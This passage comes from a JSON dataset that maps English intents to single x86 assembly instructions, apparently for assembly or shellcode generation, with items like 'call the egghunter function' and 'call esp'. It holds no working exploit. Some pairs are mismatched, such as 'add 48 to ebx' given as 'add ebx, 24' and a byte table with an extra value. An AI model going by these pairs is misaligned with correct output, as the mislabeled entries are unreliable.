      "edx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "contents",
      "var0",
      "contents",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the contents of the edx register to the contents of eax register",
    "rewritten_intent": "add the contents of the edx register to the contents of eax register",
    "snippet": "add eax, edx",
    "slot_map": {
      "edx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the contents of esi to the contents of eax",
    "rewritten_intent": "add the contents of esi to the contents of eax",
    "snippet": "add eax, esi",
    "slot_map": {
      "esi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "contents",
      "var0",
      "contents",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the contents of the esi register to the contents of eax register",
    "rewritten_intent": "add the contents of the esi register to the contents of eax register",
    "snippet": "add eax, esi",
    "slot_map": {
      "esi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "add",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x2 to the contents of ebp",
    "rewritten_intent": "add 0x2 to the contents of ebp",
    "snippet": "add ebp, 0x2",
    "slot_map": {
      "0x2": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 16 to ebx",
    "rewritten_intent": "add 16 to ebx",
    "snippet": "add ebx, 16",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "add",
      "16",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "16"
    ]
  },
  {
    "intent": "add decimal integer 2 to ebx",
    "rewritten_intent": "add decimal integer 2 to ebx",
    "snippet": "add ebx, 2",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "add",
      "decimal",
      "integer",
      "2",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "add 2 to the contents of the ebx register",
    "rewritten_intent": "add 2 to the contents of the ebx register",
    "snippet": "add ebx, 2",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "add",
      "2",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "add 48 to ebx",
    "rewritten_intent": "add 48 to ebx",
    "snippet": "add ebx, 24",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "add",
      "48",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "24"
    ]
  },
  {
    "intent": "add 3 to the contents of the ebx register",
    "rewritten_intent": "add 3 to the contents of the ebx register",
    "snippet": "add ebx, 3",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "add",
      "3",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "3"
    ]
  },
  {
    "intent": "add decimal integer 5 to ebx",
    "rewritten_intent": "add decimal integer 5 to ebx",
    "snippet": "add ebx, 5",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "add",
      "decimal",
      "integer",
      "5",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "5"
    ]
  },
  {
    "intent": "add ecx to ebx",
    "rewritten_intent": "add ecx to ebx",
    "snippet": "add ebx, ecx",
    "slot_map": {
      "ecx": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 16 to ecx",
    "rewritten_intent": "add 16 to ecx",
    "snippet": "add ecx, 16",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "add",
      "16",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "16"
    ]
  },
  {
    "intent": "add ebx to ecx",
    "rewritten_intent": "add ebx to ecx",
    "snippet": "add ecx, ebx",
    "slot_map": {
      "ebx": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the contents of edi to the contents of edi",
    "rewritten_intent": "add the contents of edi to the contents of edi",
    "snippet": "add edi, edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "add",
      "contents",
      "var0",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the contents of the edi register to the contents of edi register",
    "rewritten_intent": "add the contents of the edi register to the contents of edi register",
    "snippet": "add edi, edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "add",
      "contents",
      "var0",
      "register",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "set edx to next 16 byte block",
    "rewritten_intent": "set edx to next 16 byte block",
    "snippet": "add edx, 16",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "set",
      "var0",
      "next",
      "16",
      "byte",
      "block"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "16"
    ]
  },
  {
    "intent": "add 32 to edx",
    "rewritten_intent": "add 32 to edx",
    "snippet": "add edx, 32",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "add",
      "32",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "32"
    ]
  },
  {
    "intent": "add 48 to edx",
    "rewritten_intent": "add 48 to edx",
    "snippet": "add edx, 48",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "add",
      "48",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "48"
    ]
  },
  {
    "intent": "add 64 to the contents of the edx register",
    "rewritten_intent": "add 64 to the contents of the edx register",
    "snippet": "add edx, 64",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "add",
      "64",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "64"
    ]
  },
  {
    "intent": "add the contents of eax to the contents of edx",
    "rewritten_intent": "add the contents of eax to the contents of edx",
    "snippet": "add edx, eax",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "add",
      "contents",
      "var0",
      "contents",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the contents of the eax register to the contents of edx register",
    "rewritten_intent": "add the contents of the eax register to the contents of edx register",
    "snippet": "add edx, eax",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "add",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add the contents of the eax register to the edx register",
    "rewritten_intent": "add the contents of the eax register to the edx register",
    "snippet": "add edx, eax",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "add",
      "contents",
      "var0",
      "register",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add ecx to edx",
    "rewritten_intent": "add ecx to edx",
    "snippet": "add edx, ecx",
    "slot_map": {
      "ecx": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x21354523 to the contents in esi and save the result in esi",
    "rewritten_intent": "add 0x21354523 to the contents in esi and save the result in esi",
    "snippet": "add esi, 0x21354523",
    "slot_map": {
      "0x21354523": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x21354523 to the contents of esi",
    "rewritten_intent": "add 0x21354523 to the contents of esi",
    "snippet": "add esi, 0x21354523",
    "slot_map": {
      "0x21354523": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x30 to esi",
    "rewritten_intent": "add 0x30 to esi",
    "snippet": "add esi, 0x30",
    "slot_map": {
      "0x30": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x33333333 value to esi",
    "rewritten_intent": "add 0x33333333 value to esi",
    "snippet": "add esi, 0x33333333",
    "slot_map": {
      "0x33333333": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x3f3f3f3f to the contents in esi and save the result in esi",
    "rewritten_intent": "add 0x3f3f3f3f to the contents in esi and save the result in esi",
    "snippet": "add esi, 0x3f3f3f3f",
    "slot_map": {
      "0x3f3f3f3f": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 4 to esi",
    "rewritten_intent": "add 4 to esi",
    "snippet": "add esi, 4",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "add",
      "4",
      "var0"
    ],
    "snippet_tokens": [
      "add",
      "var0",
      ",",
      "4"
    ]
  },
  {
    "intent": "add the contents of the eax register to the contents of esi register",
    "rewritten_intent": "add the contents of the eax register to the contents of esi register",
    "snippet": "add esi, eax",
    "slot_map": {
      "eax": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "add",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add eax to esi",
    "rewritten_intent": "add eax to esi",
    "snippet": "add esi, eax",
    "slot_map": {
      "eax": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "add",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "add",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 0x20 to the contents in esp and save the result in esp",
    "rewritten_intent": "add 0x20 to the contents in esp and save the result in esp",
    "snippet": "add esp, 0x20",
    "slot_map": {
      "0x20": "var0"
    },
    "intent_tokens": [
      "add",
      "var0",
      "contents",
      "esp",
      "and",
      "save",
      "result",
      "esp"
    ],
    "snippet_tokens": [
      "add",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "add 3 to the contents of esp",
    "rewritten_intent": "add 3 to the contents of esp",
    "snippet": "add esp, 3",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "3",
      "contents",
      "esp"
    ],
    "snippet_tokens": [
      "add",
      "esp",
      ",",
      "3"
    ]
  },
  {
    "intent": "add 3 to the contents of the esp register",
    "rewritten_intent": "add 3 to the contents of the esp register",
    "snippet": "add esp, 3",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "3",
      "contents",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "esp",
      ",",
      "3"
    ]
  },
  {
    "intent": "add 4 to the esp register",
    "rewritten_intent": "add 4 to the esp register",
    "snippet": "add esp, 4",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "4",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "add",
      "esp",
      ",",
      "4"
    ]
  },
  {
    "intent": "add 10 to the variable marks",
    "rewritten_intent": "add 10 to the variable marks",
    "snippet": "add marks, 10",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "10",
      "variable",
      "marks"
    ],
    "snippet_tokens": [
      "add",
      "marks",
      ",",
      "10"
    ]
  },
  {
    "intent": "define the byte addr and initialize it to 0x1",
    "rewritten_intent": "define the byte addr and initialize it to 0x1",
    "snippet": "addr: db 0x1",
    "slot_map": {
      "0x1": "var1",
      "addr": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "var0",
      "and",
      "initialize",
      "it",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "db",
      "var1"
    ]
  },
  {
    "intent": "define the all label",
    "rewritten_intent": "define the all label",
    "snippet": "all:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "all",
      "label"
    ],
    "snippet_tokens": [
      "all",
      ":"
    ]
  },
  {
    "intent": "define the doubleword an_integer and initialize it to 12425",
    "rewritten_intent": "define the doubleword an_integer and initialize it to 12425",
    "snippet": "an_integer dd 12425",
    "slot_map": {
      "an_integer": "var0"
    },
    "intent_tokens": [
      "define",
      "doubleword",
      "var0",
      "and",
      "initialize",
      "it",
      "12425"
    ],
    "snippet_tokens": [
      "var0",
      "dd",
      "12425"
    ]
  },
  {
    "intent": "perform a logical and operation between the al register and the 0fh value and store the result in the al register",
    "rewritten_intent": "perform a logical and operation between the al register and the 0fh value and store the result in the al register",
    "snippet": "and al, 0fh",
    "slot_map": {
      "0fh": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "and",
      "operation",
      "al",
      "register",
      "and",
      "var0",
      "value",
      "and",
      "store",
      "result",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "and",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform logical and between ax and 1",
    "rewritten_intent": "perform logical and between ax and 1",
    "snippet": "and ax, 1",
    "slot_map": {},
    "intent_tokens": [
      "perform",
      "logical",
      "and",
      "ax",
      "and",
      "1"
    ],
    "snippet_tokens": [
      "and",
      "ax",
      ",",
      "1"
    ]
  },
  {
    "intent": "mask out lowest 4 bits of the eax register",
    "rewritten_intent": "mask out lowest 4 bits of the eax register",
    "snippet": "and eax, 0000000fh",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "mask",
      "out",
      "lowest",
      "4",
      "bits",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "and",
      "var0",
      ",",
      "0000000fh"
    ]
  },
  {
    "intent": "clear all but the last 4 bits of eax",
    "rewritten_intent": "clear all but the last 4 bits of eax",
    "snippet": "and eax, 0fh",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "clear",
      "all",
      "but",
      "last",
      "4",
      "bits",
      "var0"
    ],
    "snippet_tokens": [
      "and",
      "var0",
      ",",
      "0fh"
    ]
  },
  {
    "intent": "perform and operation between eax and 3f465456 and save the result in eax",
    "rewritten_intent": "perform and operation between eax and 3f465456 and save the result in eax",
    "snippet": "and eax, 3f465456",
    "slot_map": {
      "eax": "var0",
      "3f465456": "var2"
    },
    "intent_tokens": [
      "perform",
      "and",
      "operation",
      "var0",
      "and",
      "var2",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "and",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "perform and operation between eax and 40392b29 and save the result in eax",
    "rewritten_intent": "perform and operation between eax and 40392b29 and save the result in eax",
    "snippet": "and eax, 40392b29",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "perform",
      "and",
      "operation",
      "var0",
      "and",
      "40392b29",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "and",
      "var0",
      ",",
      "40392b29"
    ]
  },
  {
    "intent": "mask out lowest 4 bits of the ebx register",
    "rewritten_intent": "mask out lowest 4 bits of the ebx register",
    "snippet": "and ebx, 0000000fh",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "mask",
      "out",
      "lowest",
      "4",
      "bits",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "and",
      "var0",
      ",",
      "0000000fh"
    ]
  },
  {
    "intent": "mask out lowest 4 bits of the ecx register",
    "rewritten_intent": "mask out lowest 4 bits of the ecx register",
    "snippet": "and ecx, 0000000fh",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "mask",
      "out",
      "lowest",
      "4",
      "bits",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "and",
      "var0",
      ",",
      "0000000fh"
    ]
  },
  {
    "intent": "mask out lowest 4 bits of the edx register",
    "rewritten_intent": "mask out lowest 4 bits of the edx register",
    "snippet": "and edx, 0000000fh",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "mask",
      "out",
      "lowest",
      "4",
      "bits",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "and",
      "var0",
      ",",
      "0000000fh"
    ]
  },
  {
    "intent": "perform and operation on the variable mask1 and 128",
    "rewritten_intent": "perform and operation on the variable mask1 and 128",
    "snippet": "and mask1, 128",
    "slot_map": {
      "mask1": "var0"
    },
    "intent_tokens": [
      "perform",
      "and",
      "operation",
      "variable",
      "var0",
      "and",
      "128"
    ],
    "snippet_tokens": [
      "and",
      "var0",
      ",",
      "128"
    ]
  },
  {
    "intent": "define the doubleword arr and initialize it to 100",
    "rewritten_intent": "define the doubleword arr and initialize it to 100",
    "snippet": "arr dd 100",
    "slot_map": {
      "arr": "var0"
    },
    "intent_tokens": [
      "define",
      "doubleword",
      "var0",
      "and",
      "initialize",
      "it",
      "100"
    ],
    "snippet_tokens": [
      "var0",
      "dd",
      "100"
    ]
  },
  {
    "intent": "define the doubleword arr and initialize it to 50",
    "rewritten_intent": "define the doubleword arr and initialize it to 50",
    "snippet": "arr dd 50",
    "slot_map": {
      "arr": "var0"
    },
    "intent_tokens": [
      "define",
      "doubleword",
      "var0",
      "and",
      "initialize",
      "it",
      "50"
    ],
    "snippet_tokens": [
      "var0",
      "dd",
      "50"
    ]
  },
  {
    "intent": "reserve the array arr1 of 400 uninitialized bytes",
    "rewritten_intent": "reserve the array arr1 of 400 uninitialized bytes",
    "snippet": "arr1 resb 400",
    "slot_map": {
      "arr1": "var0",
      "uninitialized": "var1"
    },
    "intent_tokens": [
      "reserve",
      "array",
      "var0",
      "400",
      "var1",
      "bytes"
    ],
    "snippet_tokens": [
      "var0",
      "resb",
      "400"
    ]
  },
  {
    "intent": "define the doubleword arr and initialize it to 20",
    "rewritten_intent": "define the doubleword arr and initialize it to 20",
    "snippet": "array dd 20",
    "slot_map": {
      "arr": "var0"
    },
    "intent_tokens": [
      "define",
      "doubleword",
      "var0",
      "and",
      "initialize",
      "it",
      "20"
    ],
    "snippet_tokens": [
      "array",
      "dd",
      "20"
    ]
  },
  {
    "intent": "define an array of 20 initialized word",
    "rewritten_intent": "define an array of 20 initialized word",
    "snippet": "array word 20",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "array",
      "20",
      "initialized",
      "word"
    ],
    "snippet_tokens": [
      "array",
      "word",
      "20"
    ]
  },
  {
    "intent": "define an array of 5 initialized word",
    "rewritten_intent": "define an array of 5 initialized word",
    "snippet": "array word 5",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "array",
      "5",
      "initialized",
      "word"
    ],
    "snippet_tokens": [
      "array",
      "word",
      "5"
    ]
  },
  {
    "intent": "create variable b in memory and initialize to zero",
    "rewritten_intent": "create variable b in memory and initialize to zero",
    "snippet": "b: dd 0x0",
    "slot_map": {},
    "intent_tokens": [
      "create",
      "variable",
      "b",
      "memory",
      "and",
      "initialize",
      "zero"
    ],
    "snippet_tokens": [
      "b",
      ":",
      "dd",
      "0x0"
    ]
  },
  {
    "intent": "define the doubleword variable big_number and initialize it to 123456789",
    "rewritten_intent": "define the doubleword variable big_number and initialize it to 123456789",
    "snippet": "big_number dd 123456789",
    "slot_map": {
      "big_number": "var0"
    },
    "intent_tokens": [
      "define",
      "doubleword",
      "variable",
      "var0",
      "and",
      "initialize",
      "it",
      "123456789"
    ],
    "snippet_tokens": [
      "var0",
      "dd",
      "123456789"
    ]
  },
  {
    "intent": "reserve 1 word at location bignum",
    "rewritten_intent": "reserve 1 word at location bignum",
    "snippet": "bignum: resw 1",
    "slot_map": {
      "bignum": "var0"
    },
    "intent_tokens": [
      "reserve",
      "1",
      "word",
      "location",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "resw",
      "1"
    ]
  },
  {
    "intent": "reserve 64 bytes for buffer",
    "rewritten_intent": "reserve 64 bytes for buffer",
    "snippet": "buffer: resb 64",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "reserve",
      "64",
      "bytes",
      "var0",
      "buffer"
    ],
    "snippet_tokens": [
      "buffer",
      ":",
      "resb",
      "64"
    ]
  },
  {
    "intent": "declare buffersize to be a word containing 1024",
    "rewritten_intent": "declare buffersize to be a word containing 1024",
    "snippet": "buffersize: dw 1024",
    "slot_map": {
      "buffersize": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "be",
      "word",
      "containing",
      "1024"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "dw",
      "1024"
    ]
  },
  {
    "intent": "define a tables of bytes byte_table and initialize to 14, 15 and 22",
    "rewritten_intent": "define a tables of bytes byte_table and initialize to 14, 15 and 22",
    "snippet": "byte_table db 14, 15, 22, 45",
    "slot_map": {
      "byte_table": "var0"
    },
    "intent_tokens": [
      "define",
      "tables",
      "bytes",
      "var0",
      "and",
      "initialize",
      "14",
      ",",
      "15",
      "and",
      "22"
    ],
    "snippet_tokens": [
      "var0",
      "db",
      "14",
      ",",
      "15",
      ",",
      "22",
      ",",
      "45"
    ]
  },
  {
    "intent": "define the byte value byte_value and initialize it to 150",
    "rewritten_intent": "define the byte value byte_value and initialize it to 150",
    "snippet": "byte_value db 150",
    "slot_map": {
      "byte_value": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "value",
      "var0",
      "and",
      "initialize",
      "it",
      "150"
    ],
    "snippet_tokens": [
      "var0",
      "db",
      "150"
    ]
  },
  {
    "intent": "define the byte value bytes and initialize it to 10",
    "rewritten_intent": "define the byte value bytes and initialize it to 10",
    "snippet": "bytes db 10",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "byte",
      "value",
      "bytes",
      "and",
      "initialize",
      "it",
      "10"
    ],
    "snippet_tokens": [
      "bytes",
      "db",
      "10"
    ]
  },
  {
    "intent": "define the byte value bytes and initialize it to 20",
    "rewritten_intent": "define the byte value bytes and initialize it to 20",
    "snippet": "bytes db 20",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "byte",
      "value",
      "bytes",
      "and",
      "initialize",
      "it",
      "20"
    ],
    "snippet_tokens": [
      "bytes",
      "db",
      "20"
    ]
  },
  {
    "intent": "call the _appendfile function",
    "rewritten_intent": "call the _appendfile function",
    "snippet": "call _appendfile",
    "slot_map": {
      "_appendfile": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the _build function",
    "rewritten_intent": "call the _build function",
    "snippet": "call _build",
    "slot_map": {
      "_build": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call _continue",
    "rewritten_intent": "call _continue",
    "snippet": "call _continue",
    "slot_map": {
      "_continue": "var0"
    },
    "intent_tokens": [
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the _continue function",
    "rewritten_intent": "call the _continue function",
    "snippet": "call _continue",
    "slot_map": {
      "_continue": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the _exec function",
    "rewritten_intent": "call the _exec function",
    "snippet": "call _exec",
    "slot_map": {
      "_exec": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call _exit",
    "rewritten_intent": "call _exit",
    "snippet": "call _exit",
    "slot_map": {
      "_exit": "var0"
    },
    "intent_tokens": [
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call _malloc",
    "rewritten_intent": "call _malloc",
    "snippet": "call _malloc",
    "slot_map": {
      "_malloc": "var0"
    },
    "intent_tokens": [
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the _params function",
    "rewritten_intent": "call the _params function",
    "snippet": "call _params",
    "slot_map": {
      "_params": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the _printf function",
    "rewritten_intent": "call the _printf function",
    "snippet": "call _printf",
    "slot_map": {
      "_printf": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the _write function",
    "rewritten_intent": "call the _write function",
    "snippet": "call _write",
    "slot_map": {
      "_write": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the function in esp",
    "rewritten_intent": "call the function in esp",
    "snippet": "call [esp]",
    "slot_map": {},
    "intent_tokens": [
      "call",
      "function",
      "esp"
    ],
    "snippet_tokens": [
      "call",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "call the atoi function",
    "rewritten_intent": "call the atoi function",
    "snippet": "call atoi",
    "slot_map": {
      "atoi": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the code function",
    "rewritten_intent": "call the code function",
    "snippet": "call code",
    "slot_map": {
      "code": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the doit function",
    "rewritten_intent": "call the doit function",
    "snippet": "call doit",
    "slot_map": {
      "doit": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the egghunter function",
    "rewritten_intent": "call the egghunter function",
    "snippet": "call egghunter",
    "slot_map": {
      "egghunter": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call esi",
    "rewritten_intent": "call esi",
    "snippet": "call esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the function in esi",
    "rewritten_intent": "call the function in esi",
    "snippet": "call esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "call",
      "function",
      "var0"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call esp",
    "rewritten_intent": "call esp",
    "snippet": "call esp",
    "slot_map": {},
    "intent_tokens": [
      "call",
      "esp"
    ],
    "snippet_tokens": [
      "call",
      "esp"
    ]
  },
  {
    "intent": "call the execute function",
    "rewritten_intent": "call the execute function",
    "snippet": "call execute",
    "slot_map": {
      "execute": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call function internetreadfile",
    "rewritten_intent": "call function internetreadfile",
    "snippet": "call internetreadfile",
    "slot_map": {
      "internetreadfile": "var0"
    },
    "intent_tokens": [
      "call",
      "function",
      "var0"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the iprint function",
    "rewritten_intent": "call the iprint function",
    "snippet": "call iprint",
    "slot_map": {
      "iprint": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the iprintlf function",
    "rewritten_intent": "call the iprintlf function",
    "snippet": "call iprintlf",
    "slot_map": {
      "iprintlf": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call jmp_search",
    "rewritten_intent": "call jmp_search",
    "snippet": "call jmp_search",
    "slot_map": {
      "jmp_search": "var0"
    },
    "intent_tokens": [
      "call",
      "var0"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the jmp_search function",
    "rewritten_intent": "call the jmp_search function",
    "snippet": "call jmp_search",
    "slot_map": {
      "jmp_search": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the loader function",
    "rewritten_intent": "call the loader function",
    "snippet": "call loader",
    "slot_map": {
      "loader": "var0"
    },
    "intent_tokens": [
      "call",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "call",
      "var0"
    ]
  },
  {
    "intent": "call the main function",
    "rewritten_intent": "call the main function",
    "snippet": "call main",
